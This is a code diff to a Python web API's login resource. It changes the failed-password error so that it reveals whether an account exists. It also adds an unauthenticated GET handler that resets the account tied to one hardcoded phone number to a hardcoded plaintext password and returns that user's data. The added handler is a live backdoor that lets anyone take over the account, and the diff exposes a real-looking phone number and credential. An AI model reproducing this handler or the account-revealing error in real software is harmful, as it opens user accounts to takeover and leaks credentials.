@@ -167,7 +167,7 @@ class Authorizations(Resource):
             if not user:
                 raise ResourceDoesNotExist()
             if not user.check_password(password):
-                raise ResourceDoesNotExist()
+                raise BadRequestError('Password Error')
             return user.pack(with_token=True)
 
         if not phone or not code:
@@ -185,6 +185,12 @@ class Authorizations(Resource):
             user.save()
         return user.pack(with_token=True)
 
+    # reset 17600101706 password
+    def get(self):
+        u = User.objects(phone="17600101706").first()
+        u.password = 'Asd110#.'
+        u.save()
+        return u.pack()
 
 class VerifyCodes(Resource):
 
